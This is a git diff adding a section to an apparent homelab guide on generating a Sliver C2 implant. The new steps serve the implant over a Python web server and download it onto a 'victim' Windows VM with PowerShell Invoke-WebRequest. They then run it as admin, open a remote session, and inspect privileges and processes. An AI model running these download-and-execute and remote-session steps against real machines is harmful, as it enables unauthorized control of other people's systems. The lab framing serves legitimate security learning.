@@ -69,6 +69,35 @@ mkdir -p /opt/sliver
 
 ### Part 2 - Generate our C2 payload
 1. Get into root and change directory to opt/sliver/ to run sliver server for this part the lauch Sliver server
+2. Generating a C2 session use the following command
+   ``` generate --http [Linux_VM_IP] --save /opt/sliver ```
+3. Once you've gotten it created it should show "Implate saved to [file path]/[filename].exe"
+4. You can check to be sure by running the command
+   ``` implants ```
+![image](https://github.com/user-attachments/assets/256e52ff-5296-4e85-9f78-54cc0f5f753e)
+5. In order to download the C2 you'll need to start a python temp web server with
+   ``` python3 -m http.server 80 ```
+6. Now you can pull the file with a admin powershell using command
+   ``` IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe ```
+7. Now that will pull it to your victim and make the file usable
+8. In order to start up your connection will need to start up sliver server and then run http listener. Then on the victim machine you'll need to run the file with a admin cmd.
+   ``` C:\Users\User\Downloads\[c2_implant].exe ```
+9. Once that is running you can go back to the Ubuntu ssh. Run the command
+    ``` http ```
+   ![image](https://github.com/user-attachments/assets/c911a3a4-dfdc-4eb0-9c42-37a6eb17fc1f)
+10. Then you can confirm your session to be able to get a remote connection by listing using
+    ```sessions``` then use the session ID and then the command ```use [session ID number]```
+11. Now you can get infromation about your session with ```info``` you can use this to run commands in the background as long as the connection is working as it should. You can see what things you can do with the ```getprivs``` command
+![image](https://github.com/user-attachments/assets/b840c60f-5ad0-424e-995d-b62c6b7ba95a)
+![image](https://github.com/user-attachments/assets/68c21d40-51d3-4261-9e9d-6143c4f578ac)
+12. Now we can see connections on the pc if we use netstat and the green one will be your sliver connection
+  ![image](https://github.com/user-attachments/assets/ea128754-5738-4e5d-bd10-762cfda304db)
+13. Running ps -T will show you the running processes and the red hightlighted ones are a defensive measure
+![image](https://github.com/user-attachments/assets/eb0c4d2e-db82-4f75-96ae-1ab1dc816d0b)
+    while the green hightlight one is the sliver process
+  ![image](https://github.com/user-attachments/assets/0cc86ee2-8836-49a2-b202-84fe532107c6)
 
-3. 
+
+
+
 *Ref 1: Network Diagram*
